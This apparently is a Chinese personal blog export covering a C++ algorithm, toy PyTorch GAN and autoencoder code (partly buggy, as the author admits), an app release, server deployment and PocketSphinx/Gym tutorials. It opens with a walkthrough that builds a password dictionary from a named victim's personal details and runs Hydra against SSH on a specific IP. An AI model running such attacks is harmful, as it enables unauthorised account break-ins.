生成密码字典：[+] Insert the informations about the victim to make a dictionary[+] If you don't know all the info, just hit enter when asked! ;)&gt; Name: jintian&gt; Surname: jin&gt; Nickname: tian&gt; Birthdate (DDMMYYYY): 19931211&gt; Wife's(husband's) name:&gt; Wife's(husband's) nickname:&gt; Wife's(husband's) birthdate (DDMMYYYY):&gt; Child's name:&gt; Child's nickname:&gt; Child's birthdate (DDMMYYYY):&gt; Pet's name:&gt; Company name:&gt; Do you want to add some key words about the victim? Y/[N]: n&gt; Do you want to add special chars at the end of words? Y/[N]: n&gt; Do you want to add some random numbers at the end of words? Y/[N]y&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y[+] Now making a dictionary...[+] Sorting list and removing duplicates...[+] Saving dictionary to jintian.txt, counting 6540 words. 然后开始攻击目标服务器：hydra -t 4 -L userlist.txt -P jintian.txt 139.179.158.211 ssh 我们可以看到输出：Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2017-06-07 14:51:40[WARNING] Restorefile (you have 10 seconds to abort...) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 4 tasks per 1 server, overall 4 tasks, 32700 login tries (l:5/p:6540), ~8175 tries per task[DATA] attacking service ssh on port 22[STATUS] 64.00 tries/min, 64 tries in 00:01h, 32636 to do in 08:30h, 4 active[STATUS] 61.33 tries/min, 184 tries in 00:03h, 32516 to do in 08:51h, 4 active[STATUS] 58.71 tries/min, 411 tries in 00:07h, 32289 to do in 09:10h, 4 active 目测要9个小时才能出结果，但是如果一开始字典没有设置好，可能得不到结果，社会工程很重要啊！！！ 下一个系列我们将破解wifi密码。","categories":[],"tags":[]},{"title":"C++ 算法精研系列一","slug":"C-算法精研系列一","date":"2017-06-07T04:43:12.000Z","updated":"2017-06-07T05:06:14.000Z","comments":true,"path":"2017/06/07/C-算法精研系列一/","link":"","permalink":"http://yoursite.com/2017/06/07/C-算法精研系列一/","excerpt":"","text":"C++算法精细研究系列经典问题一 这个问题其实很经典，简而言之，就是一个数组中，有正有负，求取一个和最大的连续子数组。 这几天在看算法，都得过一遍，但是要领会算法里面的思想，所有代码都用c++实现。首先咋一看这个问题，我们先不管最优算法是如何实现的，直接一顿暴力计算怎么样？思考一下，暴力计算其实很简单，比如我们有数组：int a[10] = &#123;-1, -2, 2, 9, 2, -4, 2, -1, -9, -3&#125;; 那首先我们要遍历一下数组a，在每一个子循环里面，从i-&gt;a.size,遍历，i-&gt;a.size中的每个j，求取i-&gt;j的子序列和。三个遍历应该就可以把所有情况便利玩。直接上代码了：void findMaxContinueSeq(int* result, int a[], int size)&#123; // result, returns the bounds and max sum, size is the a list size int maxSum = 0; int sum=0; int maxStartIndex = 0; int maxEndIndex = 0; for (int i = 0; i &lt; size; ++i) &#123; for (int j = i; j &lt; size; ++j) &#123; for (int k = i; k &lt; j; ++k) &#123; sum += a[k]; &#125; if (sum &gt; maxSum) maxSum = sum, maxStartIndex = i, maxEndIndex = j-1; sum = 0; &#125; &#125; cout &lt;&lt; \"max sum: \" &lt;&lt; maxSum &lt;&lt; endl; cout &lt;&lt; \"max start index: \"&lt;&lt; maxStartIndex &lt;&lt; endl; cout &lt;&lt; \"max end index: \"&lt;&lt; maxEndIndex &lt;&lt; endl;&#125; 我们设置两个标志位，一个是最大序列的起始一个是终止，起始出现的位置就在当和比暂存器大的时候，把这时候的i记录下来，终止就是j。这个算法起始也很简单的。但是时间复杂度是o(n^3)，因为要遍历三个循环。 接下来我们看一个只需要一次循环就可以解决的算法。这个最优算法，起始道理也是很简单，我就是遍历一次，首先假设一个b=0，每次加一个数，我都用b+a[i],然后我都判断一下，加完之后是大于0还是小于0，如果小于0，那很显然，就抛弃b，把b重置为a[i]从新开始一个序列，加入不小于零，在判断一下b和暂存的最大值大小，如果大，就把暂存最大值更新，小就不管了。这个算法其实用到了呀一个双重保险的思想，即首先添加一个数如果变成了负的，我就终端这个序列，重头开始，如果没有，再判断一下加了之后是变大了还是变小了，如果变大了就更新，没有就保存之前的值，实际上如果没有变大了说明加了一个负数，但是还没有小于零，没有小于零说明还有希望加到一个更大的正数，因此，不到b小于零都不要中断这个序列，一直加下去，实在是小于0了在重置b，开始下一个序列。仔细想一下，这个算法其实，就是基于一个非常简单的假设：序列有正有负，最大和的序列一定大于零，既然如此那我就一直加，如果大于就更新不大于继续加，知道小于零就更新序列。代码如下：void findMaxContinueSeqOptimal(int* result, int a[], int size)&#123; //算法思想很简单，首先最大值一定大于0，那么每次加一下下一个元素，我就 //判断一下，上一个和，如果小于零则直接把b重置，否则加上下一个元素 int sum=0; int b=0; int maxStartIndex = 0; int maxEndIndex = 0; for (int i = 0; i &lt; size; ++i) &#123; if (b&lt;0)&#123; b = a[i]; maxStartIndex = i; &#125; else&#123; b += a[i]; &#125; if (b&gt;sum)&#123; sum = b; maxEndIndex = i; &#125; &#125; cout &lt;&lt; \"optimal max sum: \" &lt;&lt; sum &lt;&lt; endl; cout &lt;&lt; \"max start index: \"&lt;&lt; maxStartIndex &lt;&lt; endl; cout &lt;&lt; \"max end index: \"&lt;&lt; maxEndIndex &lt;&lt; endl;&#125; 最后我们调用代码来测试一下：int main() &#123; int a[10] = &#123;-1, -2, 2, 9, 2, -4, 2, -1, -9, -3&#125;; int b; findMaxContinueSeq(a, a, 10); findMaxContinueSeqOptimal(a, a, 10); return 0;&#125; 两个函数返回的结果是一致的。","categories":[],"tags":[]},{"title":"50行代码实现GAN系列-PyTorch","slug":"50行代码实现GAN系列-PyTorch","date":"2017-05-29T09:16:22.000Z","updated":"2017-05-29T11:43:40.000Z","comments":true,"path":"2017/05/29/50行代码实现GAN系列-PyTorch/","link":"","permalink":"http://yoursite.com/2017/05/29/50行代码实现GAN系列-PyTorch/","excerpt":"","text":"人生苦短我用GAN 首先声明一下，本教程面向入门吃瓜群众，大牛可以绕道，闲话不多说，先方一波广告。（高级GAN玩法），怎么说，我越来越感觉到人工智能正在迎来生成模型的时代，以前海量数据训练模型的办法有点揠苗助长，看似效果很好，实际上机器什么卵都没有学到（至少从迁移性上看缺少一点味道，不过就图片领域来说另当别论，在CV领域监督学习还是相当成功）。但是问题来了，GAN这么屌这么牛逼，我怎么搞？怎么入门？谁带我？慌了！ 莫慌，50行代码你就可以成为无监督学习大牛我最讨厌那些，嘴里一堆算法，算法实现不出来的人。因为我喜欢看到结果啊！尤其是一些教程，就是将论文，鸡巴论文奖那么多有什么用？你码代码给我看啊，我不知道数据是什么，不知道输入维度是什么，输出什么，里面到底发生了什么变化我怎么学？这就有点像，典型的在沙漠里教你钓鱼，在我看来，论文应该是最后才去看的东西。但是问题在于，你要有一个入门的教程啊。我想这是一个鸿沟，科研里面，理论和动手的鸿沟。这篇教程就是引路人了。欢迎加入生成模型队伍。这个教程会一直保持更新，因为科技每天变幻莫测，同时我还会加入很多新内容，改进一些在以后看来是错误的说法。 首先，我们废话不多说了，直接show you the code： import numpy as npimport torchimport torch.nn as nnimport torch.nn.functional as Ffrom torch.autograd import Variableimport matplotlib.pyplot as pltfrom scipy import statsdef generate_real_data_distribution(n_dim, num_samples): all_data = [] for i in range(num_samples): x = np.random.uniform(0, 8, n_dim) y = stats.lognorm.pdf(x, 0.6) all_data.append(y) all_data = np.array(all_data) print('generated data shape: ', all_data.shape) return all_datadef batch_inputs(all_data, batch_size=6): assert isinstance(all_data, np.ndarray), 'all_data must be numpy array' batch_x = all_data[np.random.randint(all_data.shape[0], size=batch_size)] return Variable(torch.from_numpy(batch_x).float())def main(): # 给generator的噪音维数 n_noise_dim = 30 # 真实数据的维度 n_real_data_dim = 256 num_samples = 666 lr_g = 0.001 lr_d = 0.03 batch_size = 6 epochs = 1000 real_data = generate_real_data_distribution(n_real_data_dim, num_samples=num_samples) print('sample from real data: \\n', real_data[: 10]) g_net = nn.Sequential( nn.Linear(n_noise_dim, 128), nn.ReLU(), nn.Linear(128, n_real_data_dim) ) d_net = nn.Sequential( nn.Linear(n_real_data_dim, 128), nn.ReLU(), nn.Linear(128, 1), nn.Sigmoid() ) opt_d = torch.optim.Adam(d_net.parameters(), lr=lr_d) opt_g = torch.optim.Adam(g_net.parameters(), lr=lr_g) for epoch in range(epochs): for i in range(num_samples // batch_size): batch_x = batch_inputs(real_data, batch_size) batch_noise = Variable(torch.randn(batch_size, n_noise_dim)) g_data = g_net(batch_noise) # 用G判断两个输出分别多大概率是来自真正的画家 prob_fake = d_net(g_data) prob_real = d_net(batch_x) # 很显然，mean里面的这部分是一个负值，如果想整体loss变小，必须要变成正直，加一个负号，否则会越来越大 d_loss = -torch.mean(torch.log(prob_real) + torch.log(1 - prob_fake)) # 而g的loss要使得discriminator的prob_fake尽可能小，这样才能骗过它，因此也要加一个负号 g_loss = -torch.mean(torch.log(prob_fake)) opt_d.zero_grad() d_loss.backward(retain_variables=True) opt_d.step() opt_g.zero_grad() g_loss.backward(retain_variables=True) opt_g.step() print('Epoch: &#123;&#125;, batch: &#123;&#125;, d_loss: &#123;&#125;, g_loss: &#123;&#125;'.format(epoch, i, d_loss.data.numpy()[0], g_loss.data.numpy()[0]))if __name__ == '__main__': main() 这些代码，总共，也就是90行，核心代码50行，基本上，比你写一个其他程序都端，什么红黑算法，什么排序之类的。我个人比较喜欢简约，我很多时候不喜欢太鸡巴隆昌的代码。 直接开始训练吧这个GAN很简单，三部分： real data生成，这个real data我们怎么去模拟呢？注意这里用的数据是二维的，不是图片，图片是三维的，二维你可以看成是csv，或者是序列，在这里面我们每一行，也就是一个样本，是sample自某个分布的数据，这里用的分布式lognorm； d_net 和 g_net，这里两个net都是非常小，小到爆炸，这如果要是用tensorflow写就有点蛋疼了，我选择PyTorch，一目了然； loss，loss在GAN中非常重要，是接下来的重点。 OK，一阵复制粘贴，你就可以训练一个GAN，这个GAN用来做什么？就是你随机输入一个噪音，生成模型将会生成一个和lognorm分布一样的数据。也就是说，生成模型学到了lognrom分布。这能说明什么？神经网络学到了概率！用到图片里面就是，他知道哪个颜色快可能是什么东西，这也是现在的CycleGAN， DiscoGAN的原理。 我吃饭去了未完待续… 来了继续刚才的，好像我写的文章没有人看啊，伤感。自己写自己看吧，哎，我骚味改了一下代码，loss函数部分，之前的写错了，我偷一张图把。这个是公式，原始GAN论文里面给的公式，但是毫无疑问，正如很多人说的那样，GAN很容易漂移： Epoch: 47, batch: 66, d_loss: 0.7026655673980713, g_loss: 2.0336945056915283Epoch: 47, batch: 67, d_loss: 0.41225430369377136, g_loss: 2.1994106769561768Epoch: 47, batch: 68, d_loss: 0.674636960029602, g_loss: 1.5774009227752686Epoch: 47, batch: 69, d_loss: 0.5779278874397278, g_loss: 2.2797725200653076Epoch: 47, batch: 70, d_loss: 0.4029145836830139, g_loss: 2.200833559036255Epoch: 47, batch: 71, d_loss: 0.7264774441719055, g_loss: 1.5658557415008545Epoch: 47, batch: 72, d_loss: 0.46858924627304077, g_loss: 2.355680227279663Epoch: 47, batch: 73, d_loss: 0.6716371774673462, g_loss: 1.7127293348312378Epoch: 47, batch: 74, d_loss: 0.7237206101417542, g_loss: 1.4458404779434204Epoch: 47, batch: 75, d_loss: 0.9684935212135315, g_loss: 1.943861961364746Epoch: 47, batch: 76, d_loss: 0.4705852270126343, g_loss: 2.439894199371338Epoch: 47, batch: 77, d_loss: 0.4989328980445862, g_loss: 1.5290288925170898Epoch: 47, batch: 78, d_loss: 0.44530192017555237, g_loss: 2.9254989624023438Epoch: 47, batch: 79, d_loss: 0.6329593658447266, g_loss: 1.7527830600738525Epoch: 47, batch: 80, d_loss: 0.42348209023475647, g_loss: 1.856258749961853Epoch: 47, batch: 81, d_loss: 0.5396828651428223, g_loss: 2.268836498260498Epoch: 47, batch: 82, d_loss: 0.9727945923805237, g_loss: 1.0528483390808105Epoch: 47, batch: 83, d_loss: 0.7551510334014893, g_loss: 1.508225917816162Epoch: 47, batch: 84, d_loss: 2.4204068183898926, g_loss: 1.5375216007232666Epoch: 47, batch: 85, d_loss: 1.517686128616333, g_loss: 0.6334291100502014Epoch: 47, batch: 86, d_loss: inf, g_loss: 0.7990849614143372Epoch: 47, batch: 87, d_loss: nan, g_loss: nanEpoch: 47, batch: 88, d_loss: nan, g_loss: nanEpoch: 47, batch: 89, d_loss: nan, g_loss: nanEpoch: 47, batch: 90, d_loss: nan, g_loss: nanEpoch: 47, batch: 91, d_loss: nan, g_loss: nan 你如果train一下的话会发现，到一定程度就会nan，这个nan我就无法理解了，按道理来说，从loss来看我们定义的来自以log，如果为无穷那么应该是log(0)了，但是我们的discriminator出来的函数是sigmoid啊，sigmoid不可能为0，只看是0-1且不包括闭区间。这个问题比较玄学。 既然nan的话，我也不深究是因为啥了，总之这个重点在于loss，因为后面GAN的变种基本上都是在loss的训练形式上。 GAN 生成mnist我们现在玩一下mnist把。 交流我见了一个GAN群，加我微信让我拉进来。jintianiloveu, 顺便下载一个我做的app吧，内侧中，专门用来看美女图片的，你懂得。。传送门","categories":[],"tags":[]},{"title":"萝莉萝莉1.0.2版本发布","slug":"萝莉萝莉1-0-2版本发布","date":"2017-05-29T04:48:28.000Z","updated":"2017-06-07T06:56:10.000Z","comments":true,"path":"2017/05/29/萝莉萝莉1-0-2版本发布/","link":"","permalink":"http://yoursite.com/2017/05/29/萝莉萝莉1-0-2版本发布/","excerpt":"萝莉萝莉分布，定时更新新版本，你要的女神萝莉这里全都有。","text":"萝莉萝莉分布，定时更新新版本，你要的女神萝莉这里全都有。 一个文艺又猥琐的小APP 萝莉萝莉你值得把玩且不说萝莉萝莉的设计，但就功能来说，倒数日绝对精美，大家可以感受一下： 通过萝莉萝莉，大家可以记录自己最期待的日子 除了倒数日，我们依旧可以通过萝莉萝莉获取到一些有意思的资讯，比如来自知乎日报： 最后，是来自我们的福利: 萝莉萝莉从动工以来，就一直想努力实现这么一个目标： 做一个设计精美，可以随时随地看最新电影的APP，在天朝，我们实在是厌倦无休止的广告了。我们对广告的东西真的不感兴趣，你要真的好我自然会买，我甚至又一次因为一个视频连续播放一个广告3次，我把这个APP卸载了，从此再也没有用国产视频软件。且不说付费内容了，互联网生来免费，生来共享； 我们还提供了一个创造性知识共享平台-萝莉说，后面会有很多用户，包括我们官方的运营人员，会每天推送一些，有创造性的知识共享内容； 最后是午夜福利时间，萝莉萝莉刚上线，是带有美女图片的，每天更新，后来有用户说，你不清纯了哦，于是这个内容被移到了午夜。只有22点以后才能开启，并且，对女生屏蔽(女生可能更喜欢萝莉萝莉的文艺这点。 未来我们要完成的任务很多朋友说做不做iOS端，我们说，快了。除此之外，我们会把无广告，设计美观的特质，支持保留下去。当然，如果能够得到大家的支持，萝莉萝莉能走的更远。 最后来找到组织我们的QQ群： 366590979 （萝莉萝莉日常吐槽群）掌门人微信: jintianiloveu (聊天，赞助，均可)我们的网址: http://oumantech.com下载链接：http://112.74.76.245/download/luoliluoli_v1.0.2.apk","categories":[],"tags":[]},{"title":"无监督学习笔记 1: Variational Autoencoder and Adversarial Autoencoder","slug":"无监督学习笔记-1-Variational-Autoencoder-and-Adversarial-Autoencoder","date":"2017-05-24T03:24:25.000Z","updated":"2017-05-25T08:11:30.000Z","comments":true,"path":"2017/05/24/无监督学习笔记-1-Variational-Autoencoder-and-Adversarial-Autoencoder/","link":"","permalink":"http://yoursite.com/2017/05/24/无监督学习笔记-1-Variational-Autoencoder-and-Adversarial-Autoencoder/","excerpt":"无监督学习第一坑","text":"无监督学习第一坑 是时候沉下心来学习理论了，前端时间一直沉迷于写代码，后来发现，代码其实是个坑，只要自动精通了，别人写的1000行的代码老子用10行实现他。 首先请允许我用一张图来代表一下生成对抗的思想： VAE 简介VAE中文翻译叫啥，变分自动编码机？可以这么说把。其实在很久以前，我们就知道有Autoencoder这个东西，比如SparseAutoencoder，DenisingAutoencoder，但是其实这些不同的编码机本质上都是在解决一个问题：降维。不太明白哦，李彦宏说的降维打击是不是就是这样意思。说白了就是把很大的特征空间，映射到一个latent space上，比如说我们的买呢斯特，mnist，就有756维度，但是呢，这么多的维度如果用来做干，GAN，怎么办，这个时候我们就要用到编码机，压缩他，其实我在很久之前就在数据挖掘中了自动编码机和解码机但是怎么说，由于啥也不懂一阵瞎用，结果不好，也可能是本身结果就不好，这玩意儿说不好，比较玄学。 所以说VAE是干嘛的？我先写个公式装一下逼： $$L_r(x, x’) = ||x-x’||^2 $$ 这里定义的是解码之后的 $$x’$$ 和原本的 $x$ 之间的距离，很简单就是欧式距离作为loss。 这是最简单的编码的loss方程了。接下来需要添加一个东西，有时候我们希望，这个生成的东西不是乱生成的，给他一个约束，这个约束的作用就是，比如我训练很多图片，有牛有马有狗，可能生成牛的有牛的空间分布，狗的有狗的，如果毫无约束的话结果肯定是非常的不好，不要问我为毛，请原谅我这浅薄的理解，如果你有更好的理解在这里引入VAE可以在下面评论一下我更新。好了继续，那么怎么添加一个所谓的约束 呢？ 我们假设对于每个样本都有一个先验分布，我们定义 $p(x)$ 作为先验分布。这个先验分布不仅仅用来生成不同的分布，还有一个限制作用，比如我先验分布是高斯分布，那么我如果取标准差为1均值为0，则不太可能产生1000这样的生成数据。 然后问题来了，我如何去定一个loss，使得既可以加上上面的 $L_r(x, x’)$ , 同时又可以加上 $p(x)$ 计算出来的误差呢？这里就需要我们牛逼闪闪的$KL$ 距离出场了。$Kullback-Liebler Divergence$ 我们把它叫做KL距离。OK，对于VAE我们可能就会有： $L(x, x’) = L_r(x, x’) + KL(q(z|x) || p(z))$ 又一个牛逼的公式出现了，第一个term是前面的简单的欧式距离，第二个就是我们定义在$p(x)$ 上产生的$x’’$ 相对于$p(x)$ 本身的KL距离。 好了这个我们就不深究了，因为VAE实际上现实是无法实现的，原因是。。。我也不知道。。。 AAE(Adversarial AutoEncoder)接下来要出场的是我们的，对抗自动编码机，我想着应该是一个VAE的进化版本吧。和VAE不同的是，这是一个对抗版本，既然是对抗版本，就肯定需要两个网络。我偷一张图把： 从上面这张图，可以清楚的看到一个AAE的结构了。首先是一个AutoEncoder, 最简单的形式，重点是下面的对抗网络，我们的prior分布 $p(z)$ 会和Encoder的结果进行一个KL的计算。最终会得到一个loss，这个loss可以反向传播去更新对抗网络的权重，这个对抗就能够识别生成的东西是来自AutoEncoder还是先验的高斯分布。 我们定义一个对抗网络的loss公式： $LD=-\\frac{1}{m} \\sum {1} ^{m} \\log(D(Z’)) + log(1-D(Z))$ 这个是我们的鉴别网络的loss公式，$D(Z’)$ 来自于从先验分布生成的样本，$D(Z)$ 来自于AutoEncoder生成的样本。 最后问题来了，设计个这样的东西有和卵用？你不得不承认，假如说这个下面的对抗器很牛逼，也就是说能够100%分辨出样本是真实生成的还是由先验随机生成的，那么上面的生成网络也不得不迫使自己生成更加逼真的样本。等等，哪个是生成网络？？我有点乱。不管了，我们只要记住这里的重点不是什么对抗思想，而是loss的公式，loss很重要啊有没有！！！ PyTorch代码PlayGround我们用一个小小的exercise来演示一下神奇的生成对抗编码机把。（说机不说吧） 顺便学习一下PyTorch，其实我也是半桶水，首先我们定义网络吧。 # -*- coding: utf-8 -*-# author: JinTian# time: 24/05/2017 4:37 PM# Copyright 2017 JinTian. All Rights Reserved.## Licensed under the Apache License, Version 2.0 (the \"License\");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an \"AS IS\" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.# ------------------------------------------------------------------------import numpy as npimport torchimport torch.nn as nnimport torch.nn.functional as Fimport torch.optim as optimfrom torch.autograd import Variableimport matplotlib.pyplot as pltfrom scipy import statsdef generate_real_data_distribution(n_dim, num_samples): \"\"\" 生成一个数据分布，最后生成的数据是2D的 [num_samples, n_dim] [[0.3, 0.04, 0.4, 0.6], [0.3, 0.04, 0.4, 0.6], [0.3, 0.04, 0.4, 0.6]] 但是每一行都服从一个分布，你都懂得，至于什么分布比较好，我们用正态分布？用log normal可能逼格高一点 \"\"\" # 0-8 上产生 n_dim个随机数[0.1, 0.23, 0.3, 0.8,....,8] all_data = [] for i in range(num_samples): x = np.random.uniform(0, 8, n_dim) y = stats.lognorm.pdf(x, 0.6) all_data.append(y) all_data = np.array(all_data) print('generated data shape: ', all_data.shape) return all_datadef batch_inputs(all_data, batch_size=6): assert isinstance(all_data, np.ndarray), 'all_data must be numpy array' batch_x = all_data[np.random.randint(all_data.shape[0], size=batch_size)] return Variable(torch.from_numpy(batch_x))def main(): \"\"\" 我们用二维的数据来模拟GAN，让GAN来逼近一个函数？怎么样, 我们先生成一个分布把，看看GAN能不能学到这种分布 :return: \"\"\" # 定义几个参数 # 给generator的噪音维数 n_noise_dim = 30 # 真实数据的维度 n_real_data_dim = 256 num_samples = 666 lr_g = 0.001 lr_d = 0.03 batch_size = 6 epochs = 1000 real_data = generate_real_data_distribution(n_real_data_dim, num_samples=num_samples) print('sample from real data: ', real_data[: 10]) g_net = nn.Sequential( nn.Linear(n_noise_dim, 128), nn.ReLU(), nn.Linear(128, n_real_data_dim) ) d_net = nn.Sequential( nn.Linear(n_real_data_dim, 128), nn.ReLU(), nn.Linear(128, 1), nn.Sigmoid() ) opt_d = optim.Adam(d_net.parameters(), lr=lr_d) opt_g = optim.Adam(g_net.parameters(), lr=lr_g) for epoch in range(epochs): for i in range(num_samples // batch_size): batch_x = batch_inputs(real_data, batch_size) print('batch x shape: ', batch_x.data.numpy().shape) batch_noise = Variable(torch.randn(batch_size, n_noise_dim)) g_data = g_net(batch_noise) print(g_data.data.numpy().shape) # 用G判断两个输出分别多大概率是来自真正的画家 prob_real = d_net(batch_x) prob_fake = d_net(g_data) # prob_artist1 越大，D_loss越小 两个loss要理解 d_loss = torch.mean(torch.log(prob_fake) + torch.log(1 - prob_real)) g_loss = torch.mean(torch.log(1 - prob_fake)) opt_d.zero_grad() d_loss.backward(retain_variables=True) opt_d.step() opt_g.zero_grad() g_loss.backward(retain_variables=True) opt_g.step() print('Epoch: &#123;&#125;, batch: &#123;&#125;, d_loss: &#123;&#125;, g_loss: &#123;&#125;'.format(epoch, i, d_loss, g_loss))if __name__ == '__main__': main() 由于时间原因，我们已经来不及解释了，上面的简短代码就是一个普通的GAN原理，但是，如果你运行的话会报错: batch x shape: (6, 256)(6, 256)Traceback (most recent call last): File \"my_gan.py\", line 120, in &lt;module&gt; main() File \"my_gan.py\", line 101, in main prob_real = d_net(batch_x) File \"/usr/local/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 206, in __call__ result = self.forward(*input, **kwargs) File \"/usr/local/lib/python3.6/site-packages/torch/nn/modules/container.py\", line 64, in forward input = module(input) File \"/usr/local/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 206, in __call__ result = self.forward(*input, **kwargs) File \"/usr/local/lib/python3.6/site-packages/torch/nn/modules/linear.py\", line 54, in forward return self._backend.Linear()(input, self.weight, self.bias) File \"/usr/local/lib/python3.6/site-packages/torch/nn/_functions/linear.py\", line 10, in forward output.addmm_(0, 1, input, weight.t())TypeError: addmm_ received an invalid combination of arguments - got (int, int, torch.DoubleTensor, torch.FloatTensor), but expected one of: * (torch.DoubleTensor mat1, torch.DoubleTensor mat2) * (torch.SparseDoubleTensor mat1, torch.DoubleTensor mat2) * (float beta, torch.DoubleTensor mat1, torch.DoubleTensor mat2) * (float alpha, torch.DoubleTensor mat1, torch.DoubleTensor mat2) * (float beta, torch.SparseDoubleTensor mat1, torch.DoubleTensor mat2) * (float alpha, torch.SparseDoubleTensor mat1, torch.DoubleTensor mat2) * (float beta, float alpha, torch.DoubleTensor mat1, torch.DoubleTensor mat2) * (float beta, float alpha, torch.SparseDoubleTensor mat1, torch.DoubleTensor mat2) 我也不知道为毛，不知道是哪里打开的方式不对。 先暂时停一下把，这只是toy，我们得高一些真正可以运行起来的东西.","categories":[],"tags":[]},{"title":"上天的步骤","slug":"上天的步骤","date":"2017-05-23T01:02:16.000Z","updated":"2017-06-28T11:10:26.000Z","comments":true,"path":"2017/05/23/上天的步骤/","link":"","permalink":"http://yoursite.com/2017/05/23/上天的步骤/","excerpt":"本文简要记录一下上天的步骤","text":"本文简要记录一下上天的步骤 首先是相关依赖的安装直接clone我的一件安装脚本，基本上所有软件都安装就绪。 设置nginxnginx设置最简单的就是http只写80端口，如果是https的话除了服务器的防火墙比较蛋疼外，还要加上证书，证书也得加载nginx里面，除了nginx，django的服务器也要加载证书，比较蛋疼。 一步一步测试可以先改nginx，然后django启动自带的简单服务器，或者开启gunicorn。 对了如果要添加一个下载链接，只需要在nginx中映射一下本地文件的路径即可。 设置superviosr设置supervisor就是设置gunicorn，一个意思，但是这里supervisor的配置文件的后罪名不要搞错了，这个都有模板的。然后就是sudo supervisorctl startsudo supervisorctl reloadsudo supervisorctl start all 配置数据库我一般工程里面的数据库用户名和密码比较简单，但是如果是实际场景这样可不行。配置数据库首先创建一个当前系统用户名的数据库用户：sudo -u postgres createuser --superuser rootsudo -u postgres psql# 进入控制台设置刚才创建的用户的数据库密码&gt; \\password root 最后创建数据库createdb -O root luoliluolipsql ls# 可以查看到所有数据库，看看luoliluoli的所有者是不是root，如果是就可以用root和root登陆 postgresql 删除用户，并且修改表的owner 有时候，从本地导出数据库在到服务器中导入进去，会出现用户名permission denied现象，这是因为，，比如我数据库用户名是jintian，但是你导入表示后默认是系统用户名，腾讯云是ubuntu，如果你没有修改就会默认ubuntu，这时候用jintian去访问就会权限拒绝。我们要加一条语句：psql bittorrent -c \"GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO jintian\"","categories":[],"tags":[]},{"title":"PocketSphinx 人工智能第二步-语音识别库的安装和使用","slug":"PocketSphinx-人工智能第二步-语音识别库的安装和使用","date":"2017-05-17T01:32:53.000Z","updated":"2017-05-17T01:59:00.000Z","comments":true,"path":"2017/05/17/PocketSphinx-人工智能第二步-语音识别库的安装和使用/","link":"","permalink":"http://yoursite.com/2017/05/17/PocketSphinx-人工智能第二步-语音识别库的安装和使用/","excerpt":"本文介绍语音识别神器pocketsphinx的使用","text":"本文介绍语音识别神器pocketsphinx的使用 PocketSphinx介绍其实对于一个语音小白来说，去探索一些比较牛逼的库的其实是很盲目的，好在我在全球最大的男同交友网站遇到了一个大神，大神告诉我pocketsphinx是他的神器，我说可以的，于是我就谷歌了一下，发现还真的有这么个牛逼闪闪的东西。这几把集成到Jarvis里面不就实现了语音控制了吗？？？还等什么，赶紧安装一波！！ PocketSphinx的安装pocketsphinx的安装也是及其的简单了，我们首先 pip3 install pocketsphinx 然后非常兴奋的看到有这个包，运行，等待，卧槽，没有swig？？？！！好吧那就安装一下swig wget -P /temp https://cytranet.dl.sourceforge.net/project/swig/swig/swig-3.0.12/swig-3.0.12.tar.gzcd /temptar -xvf swig-3.0.12.tar.gzcd swig-3.0.12./configure./autogen.shmakemake install 顺便记录一个wget爬取全站的命令：wget -r -p -np -k -P /tmp/ https://tensorflow.org 显示成功安装了swig再安装pocketsphinx。 PocketSphinx开车好了尼玛不多说了直接开车！！！ 首先我们输入一段代码，然后运行一下： from pocketsphinx import LiveSpeechfor phrase in LiveSpeech(): print(phrase) 输出： hellohellohellohellodeepthewho are youwhere do youwho are you 感觉可能是从麦克风的原因还是有一些噪音，不过能够识别总比啥也不做强。 本次开车到此结束，谢谢大家。","categories":[],"tags":[]},{"title":"ReinforcementLearning从入门到上天Series 1","slug":"Reinforcement-从入门到上天Series-1","date":"2017-05-08T07:57:14.000Z","updated":"2017-05-08T10:34:29.000Z","comments":true,"path":"2017/05/08/Reinforcement-从入门到上天Series-1/","link":"","permalink":"http://yoursite.com/2017/05/08/Reinforcement-从入门到上天Series-1/","excerpt":"是时候入坑强化学习了，得整出点名堂出来。","text":"是时候入坑强化学习了，得整出点名堂出来。 入门其实不管是深度学习框架还是算法，自己动手去实现一些实验很重要，更重要的是得了解当下最流行的东西是什么。我感觉强化学习如果再不跟上就可能落伍时代了，毕竟强化学习和深度学习可以说是另一个新天地。 Agent, Actions, Environments, Observations, Reward, StateObservations上面应该就是强化学习基本的concept，在这里面，Observation是什么呢？其他的Action Reward State都好理解。Observation说来就是Agent对环境的观察，agent从一个状态到另一个状态后他必须要要停下来重新审视这个世界，也就是说必须要重新Observe，在这里很显然，每次Observe都应该返回一些东西，这些东西有哪些呢？也许有这些： observation: 这是一个对象，这是对环境的描述，比如一个玩flappybird的agent，他的observation就是像素点，或者说是小鸟的位置以及柱子缺口的位置。 reward: 这个动作产生之后的奖励，agent执行了这个函数之后拿到的奖励是多少是需要在一个step里面获取的。 done: 是不是该把所有的环境清零一下呢？所谓清零就是一切回到初始状态，比如玩一个游戏就是重新来过。这是一个标识位，如果重头来过的话那么就重头再来。 info: 一些每次step返回的附加信息 上面这些概念是gym里面的。但是仔细思考一下这些信息是很精简也是不可或缺的。 Show Me The Code说了那么多，然而并没又什么乱用，我们直接跑一段代码看看，这段代码用gym进行一个agent训练过程的演示: import gymdef test(): env = gym.make('CartPole-v0') env.reset() for _ in range(1000): env.render() env.step(env.action_space.sample())def train(): env = gym.make('CartPole-v0') env.reset() for i_episode in range(20): observation = env.reset() print('episode &#123;&#125;'.format(i_episode)) for t in range(100): env.render() action = env.action_space.sample() print('action: ', action) observation, reward, done, info = env.step(action=action) if done: print('episode &#123;&#125; finished, after &#123;&#125; steps'.format(i_episode, t)) breakif __name__ == '__main__': train() 这段代码会弹出一个窗口，你懂的，就是控制一个杆子。 